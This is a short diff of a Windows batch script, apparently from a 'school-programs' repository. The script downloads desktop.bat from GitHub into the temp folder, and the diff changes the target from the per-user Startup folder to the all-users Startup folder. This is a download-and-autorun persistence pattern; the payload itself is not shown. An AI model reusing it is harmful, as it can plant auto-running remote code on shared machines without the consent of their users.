@@ -10,7 +10,7 @@ type nul > done.txt
 
 cd %temp%
 curl -OL https://raw.githubusercontent.com/thekevie/school-programs/main/desktop.bat
-cd %userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+cd C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
 if not exist desktop.bat (
     type nul > desktop.bat
 )
